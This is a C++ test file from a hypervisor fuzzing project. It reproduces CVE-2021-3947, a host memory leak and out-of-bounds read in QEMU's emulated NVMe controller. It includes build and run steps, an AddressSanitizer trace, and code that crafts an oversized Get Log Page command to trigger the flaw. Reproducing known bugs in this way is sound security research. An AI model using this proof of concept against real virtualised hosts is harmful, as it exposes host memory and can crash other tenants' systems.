#include "tests.h"

// original written by Hanzhong Peng <penghanzhong22@mails.ucas.ac.cn>
// modified by Qiang Liu <cyruscyliu@gmail.com>

// retake a snapshot with the following configuration of L2 VM
//
// wget https://download.qemu.org/qemu-6.1.0.tar.bz
// tar xf qemu-6.1.0.tar.bz
// cd qemu-6.1.0
// mkdir build; cd build
// ../configure --target-list=x86_64-softmmu --enable-slirp --enable-spice --enable-sanitizers
// qemu-6.1.0/build/qemu-system-x86_64 \
//     -machine type=q35,accel=kvm -cpu host -m 4G \
//     -hda /path/to/debian_or_ubuntu.qcow2 \
//     -device nvme,drive=disk0,serial=1234,cmb_size_mb=64 \
//     -drive file=null-co://,if=none,format=raw,id=disk0 \
//     -device ich9-intel-hda \
//     -vga qxl -device virtio-serial-pci \
//     -spice port=5900,disable-ticketing=on \
//     -device virtserialport,chardev=spicechannel0,name=com.redhat.spice.0 \
//     -chardev spicevmc,id=spicechannel0,name=vdagent \
//     -netdev user,id=net0 -device e1000,netdev=net0
//
// command line to run HyperPill
//
// export PROJECT_ROOT=/path/to/HyperPill
// export SNAPSHOT_BASE=/path/to/snapshots/dir
// export MANUAL_RANGES=$SNAPSHOT_BASE/mtree
// export RANGE_REGEX="nvme"
// KVM=1 $PROJECT_ROOT/tests/run_hyperpill.sh cve-2021-3947

// original asan report:
// ==35942==ERROR: AddressSanitizer: SEGV on unknown address 0x7ffd90426dc0 (pc 0x7f2e0d4649c0 bp 0x7ffd90426dc0 sp 0x7ffc90426b48 T0)
// ==35942==The signal is caused by a READ memory access.
//     #0 0x7f2e0d4649c0  (/lib/x86_64-linux-gnu/libc.so.6+0x1529c0)
//     #1 0x55d4f3a943a3 in memcpy /usr/include/x86_64-linux-gnu/bits/string_fortified.h:29
//     #2 0x55d4f3a943a3 in flatview_write_continue ../softmmu/physmem.c:2782
//     #3 0x55d4f3a9b3c0 in flatview_write ../softmmu/physmem.c:2817
//     #4 0x55d4f3a9b3c0 in address_space_write ../softmmu/physmem.c:2909
//     #5 0x55d4f383f299 in dma_memory_rw_relaxed /root/qemu-6.1.0/include/sysemu/dma.h:88
//     #6 0x55d4f383f299 in dma_memory_rw /root/qemu-6.1.0/include/sysemu/dma.h:127
//     #7 0x55d4f383f299 in dma_buf_rw ../softmmu/dma-helpers.c:309
//     #8 0x55d4f37de0f4 in nvme_tx ../hw/nvme/ctrl.c:1154
//     #9 0x55d4f37f6c70 in nvme_c2h ../hw/nvme/ctrl.c:1189
//     #10 0x55d4f37f6c70 in nvme_changed_nslist ../hw/nvme/ctrl.c:4198
//     #11 0x55d4f3802e04 in nvme_get_log ../hw/nvme/ctrl.c:4285
//     #12 0x55d4f3802e04 in nvme_admin_cmd ../hw/nvme/ctrl.c:5475
//     #13 0x55d4f3802e04 in nvme_process_sq ../hw/nvme/ctrl.c:5530
//     #14 0x55d4f3fc98da in timerlist_run_timers ../util/qemu-timer.c:573
//     #15 0x55d4f3fc98da in timerlist_run_timers ../util/qemu-timer.c:498
//     #16 0x55d4f3fc9cf6 in qemu_clock_run_all_timers ../util/qemu-timer.c:669
//     #17 0x55d4f403c3e9 in main_loop_wait ../util/main-loop.c:542
//     #18 0x55d4f3b45338 in qemu_main_loop ../softmmu/runstate.c:726
//     #19 0x55d4f335bbbd in main ../softmmu/main.c:50
//     #20 0x7f2e0d339249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249)
//     #21 0x7f2e0d339304 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x27304)
//     #22 0x55d4f336be30 in _start (/root/qemu-6.1.0/build/qemu-system-x86_64+0x9e9e30)

#define NVME_OFFSET_ACQ     (0x0030)
#define NVME_OFFSET_ASQ     (0x0028)
#define NVME_OFFSET_AQA     (0x0024)
#define NVME_OFFSET_CC      (0x0014)
#define NVME_OFFSET_SQyTDBL (0x1000)

#define nvme_mmio_region     0xf4070000 // FIXME
#define leak_buf             0x3023000  // FIXME, must be page aligned
#define cqes                 0x3024000  // FIXME, must be page aligned
#define cmds                 0x3025000  // FIXME, must be page aligned

extern "C" int LLVMFuzzerInitialize(int *argc, char ***argv);

int main(int argc, char **argv) {
    LLVMFuzzerInitialize(&argc, &argv);

    bx_phy_address leak_buf_hpa, cqes_hpa, cmds_hpa;
    vmcs_translate_guest_physical_ept(leak_buf, &leak_buf_hpa, NULL); // GPA->HPA
    printf("leak_buf: GPA=0x%lx HPA=0x%lx\n", (unsigned long)leak_buf, leak_buf_hpa);
    vmcs_translate_guest_physical_ept(cqes, &cqes_hpa, NULL); // GPA->HPA
    printf("cqes: GPA=0x%lx HPA=0x%lx\n", (unsigned long)cqes, cqes_hpa);
    vmcs_translate_guest_physical_ept(cmds, &cmds_hpa, NULL); // GPA->HPA
    printf("cmds: GPA=0x%lx HPA=0x%lx\n", (unsigned long)cmds, cmds_hpa);

    test_mem_write_up_to_8(cmds_hpa,      1, 2);
    test_mem_write_up_to_8(cmds_hpa + 24, 8, leak_buf);
    test_mem_write_up_to_8(cmds_hpa + 40, 4, 0x10004);
    test_mem_write_up_to_8(cmds_hpa + 44, 4, 0x0);
    test_mem_write_up_to_8(cmds_hpa + 48, 4, 0xffffff00);
    test_mem_write_up_to_8(cmds_hpa + 52, 4, 0x0);

    test_mmio_write(nvme_mmio_region + NVME_OFFSET_ACQ,     2, (uint32_t)cqes & 0xffffffff);
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_ACQ + 4, 2, (uint32_t)((uint64_t)cqes >> 32));
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_ASQ,     2, (uint32_t)cmds & 0xffffffff);
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_ASQ + 4, 2, (uint32_t)((uint64_t)cmds >> 32));
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_AQA,     2, (uint32_t)0x200020);
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_CC,      2, 0);
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_CC,      2, (uint32_t)0x460001);
    test_mmio_write(nvme_mmio_region + NVME_OFFSET_SQyTDBL, 2, (uint32_t)0x1);
}